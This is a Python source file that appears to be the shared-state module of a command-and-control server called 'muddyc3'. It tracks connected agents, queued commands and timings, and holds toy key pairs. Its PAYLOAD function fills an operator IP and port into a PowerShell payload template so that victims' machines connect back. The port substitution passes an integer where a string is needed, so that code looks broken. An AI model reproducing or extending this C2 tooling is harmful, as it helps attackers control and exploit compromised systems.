PORT = 8080
VERSION = "1.0.0"
AGENTS = dict()
COMMAND = dict()
TIME = dict()
public_key = (479, 713)
private_key = (959, 713)
COUNT = 0
prv_key = (289, 437)
pub_key = (37, 437)
IP = ''
BASE = 'muddyc3'
POINTER = 'main'
# _____ ___________ ___________  ________   __  _____  _       ___ ______ _____  ___ _____ ___________ 
#/  __ \  _  |  _  \  ___|  _  \ | ___ \ \ / / |  __ \| |     / _ \|  _  \_   _|/ _ \_   _|  _  | ___ \
#| /  \/ | | | | | | |__ | | | | | |_/ /\ V /  | |  \/| |    / /_\ \ | | | | | / /_\ \| | | | | | |_/ /
#| |   | | | | | | |  __|| | | | | ___ \ \ /   | | __ | |    |  _  | | | | | | |  _  || | | | | |    / 
#| \__/\ \_/ / |/ /| |___| |/ /  | |_/ / | |   | |_\ \| |____| | | | |/ / _| |_| | | || | \ \_/ / |\ \ 
# \____/\___/|___/ \____/|___/   \____/  \_/    \____/\_____/\_| |_/___/  \___/\_| |_/\_/  \___/\_| \_|
#                                                                                                      
# 
def PAYLOAD():
	fp = open('core/payload.ps1','r')
	ps1 = fp.read()
	ps1 = ps1.replace('{ip}',IP).replace('{port}',PORT)
  
	return ps1
	
def set_port(in_port):
	global PORT
	PORT = in_port
	
def set_count(in_count):
	global COUNT
	COUNT = in_count
def set_pointer(in_pointer):
	global POINTER
	POINTER = in_pointer
def set_ip(in_ip):
	global IP
	IP = in_ip
def set_time(id,in_time):
	TIME[id] = in_time - TIME[id]
